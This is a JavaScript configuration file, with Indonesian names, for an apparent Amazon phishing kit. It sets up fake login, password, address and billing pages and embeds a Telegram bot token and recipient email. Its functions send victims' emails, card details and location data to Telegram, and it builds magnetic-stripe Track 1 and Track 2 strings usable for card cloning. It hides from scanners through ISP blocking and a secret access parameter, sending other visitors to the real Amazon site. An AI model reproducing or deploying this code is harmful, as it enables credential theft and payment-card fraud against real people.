// ==================================================
// XCHENBA — KONFIGURASI UTAMA
// ==================================================

export const TELEGRAM = {
  BOT_TOKEN: '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk',
  CHAT_ID: '7808815199'
};

export const EMAIL_PENERIMA = 'jandaanaksatu777@gmail.com';

export const TAUTAN = {
  AMAZON_ASLI: 'https://www.amazon.com',
  AMAZON: 'amazon.html',
  PASSWORD: 'password.html',
  ADDRESS: 'address.html',
  BILLING: 'billing.html',
  SELESAI: 'completed.html',
  PANEL: 'panel-rahasia.html'
};

export const KUNCI_SIMPAN = {
  EMAIL: 'xch_email',
  SANDI: 'xch_sandi',
  NAMA_LENGKAP: 'xch_nama',
  ALAMAT1: 'xch_alamat1',
  ALAMAT2: 'xch_alamat2',
  KOTA: 'xch_kota',
  PROVINSI: 'xch_provinsi',
  KODE_POS: 'xch_kodepos',
  NEGARA: 'xch_negara',
  TELEPON: 'xch_telp',
  NAMA_KARTU: 'xch_namakartu',
  NO_KARTU: 'xch_nokartu',
  EXP_KARTU: 'xch_exp',
  CVV_KARTU: 'xch_cvv',
  PARAM: 'pengaturan_param',
  BLOKIR_ISP: 'daftar_blokir_isp',
  IZINKAN_ISP: 'daftar_izinkan_isp',
  DATA_LOGIN: 'data_login_xch',
  DATA_KARTU: 'data_kartu_xch',
  DATA_BOT: 'data_bot_xch'
};

// Info Pengunjung
export async function ambilInfoPengunjung() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    return {
      ip: d.ip || '-',
      isp: d.org || d.isp || '-',
      negara: d.country_name || '-',
      kode_negara: d.country_code || 'GB',
      kode_telp: d.country_code === 'ID' ? '+62' :
                 d.country_code === 'AU' ? '+61' :
                 d.country_code === 'MY' ? '+60' :
                 d.country_code === 'US' ? '+1' : '+44',
      kota: d.city || '-',
      provinsi: d.region || '-',
      kode_pos: d.postal || '-'
    };
  } catch {
    return { ip: '-', isp: '-', negara: 'United Kingdom', kode_negara: 'GB', kode_telp: '+44', kota: '-', provinsi: '-', kode_pos: '-' };
  }
}

export function ambilInfoPerangkat() {
  const ua = navigator.userAgent;
  const perangkat = /Android|iPhone|iPad|Mobile/.test(ua) ? 'Mobile' : 'Desktop';
  let browser = 'Unknown';
  if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
  else if (/Firefox/.test(ua)) browser = 'Firefox';
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
  else if (/Edg/.test(ua)) browser = 'Edge';
  return { perangkat, browser, user_agent: ua };
}

// Kirim ke Telegram
export async function kirimTelegram(pesan) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM.CHAT_ID,
        text: pesan,
        parse_mode: 'Markdown'
      })
    });
    return res.ok;
  } catch { return false; }
}

// Track 1 & 2
export function buatTrack(nomor, nama, exp) {
  const n = nomor.replace(/\s/g,'');
  const e = exp.replace('/','');
  const nm = nama.toUpperCase().trim().replace(/[^A-Z\s]/g,' ').trim();
  const p = nm.split(' ');
  const fmt = p.length>=2 ? `${p[p.length-1]}/${p.slice(0,-1).join(' ')}` : nm || 'UNKNOWN/USER';
  return {
    t1: `%B${n}^${fmt}^${e}00000000000?`,
    t2: `;${n}=${e}00000000000?`
  };
}

// Deteksi Bahasa
export async function deteksiBahasa() {
  try {
    const d = await (await fetch('https://ipapi.co/json/')).json();
    const c = d.country_code;
    if (c==='JP') return 'ja';
    if (c==='CN') return 'zh';
    if (c==='TH') return 'th';
    if (c==='ID') return 'id';
    return 'en';
  } catch {
    const l = navigator.language;
    if (l.startsWith('ja')) return 'ja';
    if (l.startsWith('zh')) return 'zh';
    if (l.startsWith('th')) return 'th';
    if (l.startsWith('id')) return 'id';
    return 'en';
  }
}

// Cek Akses
export async function cekAkses() {
  const paramBenar = localStorage.getItem(KUNCI_SIMPAN.PARAM);
  const blokir = (localStorage.getItem(KUNCI_SIMPAN.BLOKIR_ISP) || '').toLowerCase().split(',').map(s=>s.trim()).filter(Boolean);
  
  const p = new URLSearchParams(window.location.search);
  let lolos = false;
  for (const [k,v] of p.entries()) {
    if (k===paramBenar && v==='aktif') { lolos=true; break; }
  }

  const info = await ambilInfoPengunjung();
  const isp = info.isp.toLowerCase();
  const diblokir = blokir.some(n => isp.includes(n));

  if (!lolos || diblokir) {
    const alasan = !lolos ? 'Tanpa parameter akses' : 'ISP diblokir';
    const { catatBot } = await import('./config.js');
    await catatBot(info.ip, info.isp, info.negara, alasan);
    window.location.href = TAUTAN.AMAZON_ASLI;
    return false;
  }
  return true;
}

// Catat Data
export async function catatLogin(email, ip, isp, negara) {
  const infoPerangkat = ambilInfoPerangkat();
  const teks = `
🔐 LOGIN
━━━━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
📍 IP: ${ip}
🏢 ISP: ${isp}
🌍 Negara: ${negara}
📱 Perangkat: ${infoPerangkat.perangkat}
🌐 Browser: ${infoPerangkat.browser}
🕐 Waktu: ${new Date().toLocaleString('id-ID')}
━━━━━━━━━━━━━━━━━━━━━
✅ Human
  `.trim();
  await kirimTelegram(teks);

  const d = JSON.parse(localStorage.getItem(KUNCI_SIMPAN.DATA_LOGIN) || '[]');
  d.unshift({ email, ip, isp, negara, waktu: new Date().toLocaleString('id-ID') });
  localStorage.setItem(KUNCI_SIMPAN.DATA_LOGIN, JSON.stringify(d));
}

export async function catatKartu(nama, noAkhir, ip, isp, negara) {
  const teks = `
💳 KARTU
━━━━━━━━━━━━━━━━━━━━━
👤 Nama: ${nama}
🔢 Akhir: ${noAkhir}
📍 IP: ${ip}
🏢 ISP: ${isp}
🌍 Negara: ${negara}
🕐 Waktu: ${new Date().toLocaleString('id-ID')}
━━━━━━━━━━━━━━━━━━━━━
✅ Human
  `.trim();
  await kirimTelegram(teks);

  const d = JSON.parse(localStorage.getItem(KUNCI_SIMPAN.DATA_KARTU) || '[]');
  d.unshift({ nama, noAkhir, ip, isp, negara, waktu: new Date().toLocaleString('id-ID') });
  localStorage.setItem(KUNCI_SIMPAN.DATA_KARTU, JSON.stringify(d));
}

export async function catatBot(ip, isp, negara, alasan) {
  const teks = `
⚠️ BOT
━━━━━━━━━━━━━━━━━━━━━
📍 IP: ${ip}
🏢 ISP: ${isp}
🌍 Negara: ${negara}
📝 Alasan: ${alasan}
🕐 Waktu: ${new Date().toLocaleString('id-ID')}
━━━━━━━━━━━━━━━━━━━━━
❌ Bot
  `.trim();
  await kirimTelegram(teks);

  const d = JSON.parse(localStorage.getItem(KUNCI_SIMPAN.DATA_BOT) || '[]');
  d.unshift({ ip, isp, negara, alasan, waktu: new Date().toLocaleString('id-ID') });
  localStorage.setItem(KUNCI_SIMPAN.DATA_BOT, JSON.stringify(d));
}

console.log('%c✅ config.js siap', 'color: #90ee90; font-weight:bold;');
